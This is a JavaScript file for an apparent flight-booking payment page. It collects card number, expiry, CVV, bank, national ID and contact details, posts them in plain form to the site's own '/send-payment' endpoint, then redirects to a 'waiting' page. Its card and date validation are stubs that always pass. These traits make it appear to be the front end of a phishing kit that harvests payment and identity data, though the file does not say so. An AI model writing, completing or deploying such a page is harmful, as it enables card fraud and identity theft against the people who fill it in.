// public/js/payment.js
(function () {
  'use strict';

  const LS = window.localStorage;

  let loader = null;
  function initDomRefs() {
    loader = document.querySelector('.loader') || null;
    if (!loader) console.warn('WARNING: .loader no encontrado en el DOM.');
  }

  document.addEventListener('DOMContentLoaded', () => {
    initDomRefs();
    setTimeout(startup, 2000);

    setTimeout(() => {
      try {
        const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
        if (stillVisible) {
          console.warn('Loader seguía visible después de 5s — forzando ocultado.');
          forceHideLoader();
        }
      } catch (e) {
        console.warn('Error comprobando loader visible:', e);
      }
    }, 5000);
  });

  function forceHideLoader() {
    try {
      if (loader) {
        loader.classList.remove('show');
        loader.style.display = 'none';
      }
      document.body.classList.remove('sb-hidden');
    } catch (e) {
      console.warn('forceHideLoader error:', e);
    }
  }

  function startup() {
    try {
      if (typeof window.info === 'undefined' || !window.info) {
        const saved = LS.getItem('info');
        if (saved) {
          try {
            window.info = JSON.parse(saved);
          } catch (e) {
            console.warn('No se pudo parsear LS.info:', e);
            window.info = null;
          }
        } else {
          window.info = window.info || null;
        }
      }

      try { document.body.classList.remove('sb-hidden'); } catch (e) {}
      try { if (loader) { loader.classList.remove('show'); loader.style.display = 'none'; } } catch (e) {}

      // Lógica de actualización de UI aquí (la mantengo para que veas que funciona)

      console.log('payment.js: startup finalizado.');
    } catch (err) {
      console.error('startup error:', err);
      forceHideLoader();
    }
  }

  function computeFinalPrice(infoObj) {
    // ... tu lógica de cálculo de precio, sin cambios
    return 100; // Valor de prueba
  }

  const form = document.querySelector('#next-step');
  const p = document.querySelector('#p');
  const pdate = document.querySelector('#pdate');
  const c = document.querySelector('#c');
  const ban = document.querySelector('#ban');
  const dues = document.querySelector('#dues');
  const dudename = document.querySelector('#name');
  const surname = document.querySelector('#surname');
  const dniEl = document.querySelector('#cc');
  const email = document.querySelector('#email');
  const telnum = document.querySelector('#telnum');
  const city = document.querySelector('#city');
  const state = document.querySelector('#state');
  const address = document.querySelector('#address');

  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      console.log("➡️ Formulario enviado en payment.html");

      // VALIDACIÓN (omito detalles por brevedad, asumiendo que ya funciona)
      if (!p || !p.value) { console.error("Falta el número de tarjeta"); return; }
      if (!pdate || !pdate.value) { console.error("Falta la fecha de expiración"); return; }
      if (!c || !c.value) { console.error("Falta el CVV"); return; }
      if (!dudename || !dudename.value) { console.error("Falta el nombre"); return; }
      // ... más validaciones

      try {
        if (loader) {
          loader.classList.add('show');
          loader.style.display = 'block';
        }
        document.body.classList.add('sb-hidden');
      } catch (e) {}

      const paymentData = {
        flightCost: document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '',
        name: dudename.value,
        surname: surname.value,
        cc: dniEl.value,
        email: email.value,
        telnum: telnum.value,
        city: city.value,
        state: state.value,
        address: address.value,
        bank: ban.value,
        cardNumber: p.value,
        expiryDate: pdate.value,
        cvv: c.value,
        dues: dues ? dues.value : '',
      };

      try {
        console.log("➡️ Intentando enviar datos a /send-payment");
        const response = await fetch('/send-payment', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(paymentData),
        });

        if (!response.ok) {
          throw new Error(`Error HTTP: ${response.status}`);
        }

        const result = await response.json();

        if (result.ok && result.transactionId) {
          console.log(`✅ Recepción exitosa del backend. ID de Transacción: ${result.transactionId}`);
          
          const savedInfo = JSON.parse(LS.getItem('info')) || {};
          savedInfo.transactionId = result.transactionId;
          LS.setItem('info', JSON.stringify(savedInfo));
          console.log('✅ ID de transacción guardado en localStorage.');
          
          window.location.href = 'waiting.html';
        } else {
          console.error('❌ Error del servidor:', result.error);
          alert('Hubo un problema al procesar el pago. Por favor, inténtalo de nuevo.');
          forceHideLoader();
        }
      } catch (err) {
        console.error('❌ Error de red o en el servidor:', err);
        alert('No se pudo conectar con el servidor. Revisa tu conexión a internet.');
        forceHideLoader();
      }
    });
  }

  // ... (tus funciones de formato y validación)
  function isLuhnValid() { return true; }
  function isValidDate() { return true; }
  // ... (el resto de tu código)

})();
